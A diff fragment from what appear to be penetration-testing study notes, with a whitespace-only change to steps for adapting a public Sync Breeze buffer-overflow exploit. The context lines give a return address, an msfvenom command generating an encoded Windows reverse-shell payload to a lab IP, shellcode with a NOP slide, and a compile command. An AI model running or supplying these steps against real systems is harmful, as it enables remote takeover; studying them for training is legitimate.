@@ -620,11 +620,11 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
    - change the return address `unsigned char retn[] = "\xcb\x75\x52\x73"; //ret at msvbvm60.dll`  (refer https://www.exploit-db.com/exploits/42928)
    - generate reverse shell payload with msfvenom (x86, c)
      `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
-   - modify the 42341.c
+   - modify the 42341.c  
      ```
      modify unsigned char shellcode[] = 
-	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
-	"\xdb\xcc\xbe\xa5\xcc\x28\x99\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
+     "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
+     "\xdb\xcc\xbe\xa5\xcc\x28\x99\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
      ```
    - compile the code  
      `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`  
